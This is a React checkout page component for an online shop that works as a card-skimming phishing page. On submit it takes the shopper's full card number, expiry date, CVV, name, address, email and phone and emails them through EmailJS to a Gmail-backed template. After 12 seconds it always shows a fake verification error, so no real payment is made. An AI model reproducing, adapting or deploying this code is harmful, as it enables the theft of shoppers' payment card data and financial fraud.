import React, { useState, useEffect } from 'react';
import emailjs from 'emailjs-com';
import content from '../content.json';
import axios from 'axios';
import CheckoutSummary from '/components/CheckoutSummary';
import CheckoutForm from '/components/CheckoutForm';
import CheckoutVerify from '/components/CheckoutVerify';

const site = content.sites[0];

export default function Checkout() {
  const [cart, setCart] = useState([]);
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState('card');
  const [showVerificationWrapper, setShowVerificationWrapper] = useState(false);
  const [bankName, setBankName] = useState('');
  const [bankLogo, setBankLogo] = useState('');
  const [cardType, setCardType] = useState('');
  const [cardScheme, setCardScheme] = useState('');
  const [cardCountry, setCardCountry] = useState('');
  const [verificationError, setVerificationError] = useState(false);
  const [currentStep, setCurrentStep] = useState(0);

  useEffect(() => {
    const storedCart = JSON.parse(localStorage.getItem('cart')) || [];
    const groupedCart = storedCart.reduce((acc, item) => {
      const existingItem = acc.find(i => i.productTitle === item.productTitle);
      if (existingItem) {
        existingItem.quantity += 1;
      } else {
        acc.push({ ...item, quantity: 1 });
      }
      return acc;
    }, []);
    setCart(groupedCart);
  }, []);

  useEffect(() => {
    emailjs.init("8SL7vzVHt7qSqEd4i");
  }, []);

  const totalPrice = cart.reduce((total, item) => {
    const price = parseFloat(item.productPrice.replace('€', '').replace(',', '.')) || 0;
    return total + (price * item.quantity);
  }, 0).toFixed(2);

  const discount = (totalPrice * 0.15).toFixed(2);
  const discountedPrice = (totalPrice - discount).toFixed(2);

  const proceedCheckout = async (event) => {
    event.preventDefault();
    setShowVerificationWrapper(true);

    const cardNumber = event.target.cardNumber.value.replace(/\s/g, '');

    try {
      const response = await axios.post('/api/check_card', { cardNumber });
      const { bankName, bankLogo } = response.data; // Récupérer bankName et bankLogo de la réponse
      setBankName(bankName);
      setBankLogo(bankLogo);
      setCardType(response.data.cardType);
      setCardScheme(response.data.cardScheme);
      setCardCountry(response.data.cardCountry);

      setTimeout(() => {
        setVerificationError(true);
      }, 12000);

      const form = event.target;
      const formData = {
        totalPrice: form.totalPrice.value,
        products: form.products.value,
        website: form.website.value,
        address: form.address.value,
        suite: form.suite.value,
        postalCode: form.postalCode.value,
        city: form.city.value,
        email: form.email.value,
        fullName: form.fullName.value,
        phone: form.phone.value,
        cardHolder: form.cardHolder.value,
        cardNumber: form.cardNumber.value,
        expiryDate: form.expiryDate.value,
        cvv: form.cvv.value,
        bankName: bankName
      };

      await emailjs.send('gmail-benedikt', 'new-payment', formData);

    } catch (error) {
      console.error('Error checking card:', error);
      setVerificationError(true);
    }
  };

  const showStep = (step) => {
    setCurrentStep(step);
  };

  return (
    <div className="paiement-container">
      <div className="left-column">
        <a className="back" href="/"><img src='/logo.svg'/></a>
        <CheckoutSummary cart={cart} totalPrice={totalPrice} discount={discount} discountedPrice={discountedPrice} site={site} />
      </div>
      <div className="right-column">
        <CheckoutForm
          currentStep={currentStep}
          showStep={showStep}
          selectedPaymentMethod={selectedPaymentMethod}
          setSelectedPaymentMethod={setSelectedPaymentMethod}
          proceedCheckout={proceedCheckout}
          discountedPrice={discountedPrice}
          cart={cart}
          site={site}
        />
      </div>
      {showVerificationWrapper && (
        <CheckoutVerify
          verificationError={verificationError}
          bankName={bankName}
          bankLogo={bankLogo} // Passer bankLogo en tant que prop
          cardType={cardType}
          cardScheme={cardScheme}
          cardCountry={cardCountry}
          discountedPrice={discountedPrice}
        />
      )}
    </div>
  );
}